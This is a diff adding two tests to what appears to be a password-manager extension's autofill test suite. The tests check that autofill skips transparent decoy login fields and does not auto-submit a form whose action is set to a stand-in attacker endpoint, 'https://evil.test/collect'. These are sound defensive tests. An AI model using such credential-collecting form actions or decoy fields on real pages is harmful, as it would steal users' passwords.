@@ -165,6 +165,26 @@ describe("the popup's Fill in the top frame", () => {
     expect(submitted).toHaveBeenCalledTimes(1);
   });
 
+  it("fills the real form, not the transparent decoys ahead of it (#129)", async () => {
+    await setup("login-decoy-opacity.html", (request) => (request.type === "hello" ? hello([entry]) : { ok: true, value: credentials }));
+    await expect(command({ ...fill, entryUrl: location.href, entryHost: location.host })).resolves.toEqual({ ok: true, value: null });
+    expect([byTag("bait-user").value, byTag("bait-pw").value, byTag("faded-user").value, byTag("faded-pw").value]).toEqual(["", "", "", ""]);
+    expect([byTag("user").value, byTag("pw").value]).toEqual(["alice@example.com", "hunter2!"]);
+  });
+
+  it("fills a form posting to another site but doesn't submit it (#130)", async () => {
+    await setup("login-basic.html", (request) =>
+      request.type === "hello" ? hello([entry]) : { ok: true, value: { ...credentials, autoSubmit: true } },
+    );
+    const form = byTag("pw").form as HTMLFormElement;
+    form.setAttribute("action", "https://evil.test/collect");
+    const submitted = vi.fn((event: Event) => event.preventDefault());
+    form.addEventListener("submit", submitted);
+    await expect(command({ ...fill, entryUrl: location.href, entryHost: location.host })).resolves.toEqual({ ok: true, value: null });
+    expect(byTag("pw").value).toBe("hunter2!");
+    expect(submitted).not.toHaveBeenCalled();
+  });
+
   it("stays quiet on a page without login fields", async () => {
     await setup("checkout-card.html", (request) => (request.type === "hello" ? hello([entry]) : { ok: true, value: credentials }));
     await expect(command({ ...fill, entryUrl: location.href, entryHost: location.host })).resolves.toBe(noReply);
